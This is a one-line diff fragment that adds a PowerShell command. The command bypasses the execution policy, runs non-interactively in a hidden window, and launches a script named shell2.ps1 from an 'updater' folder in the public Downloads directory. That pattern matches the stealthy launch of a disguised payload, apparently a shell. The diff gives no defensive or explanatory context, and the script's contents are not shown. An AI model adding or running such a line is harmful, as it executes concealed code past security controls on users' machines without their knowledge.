@@ -1,0 +1,1 @@
+powershell -exec bypass -NonI -W Hidden -File C:\Users\Public\Downloads\updater\shell2.ps1
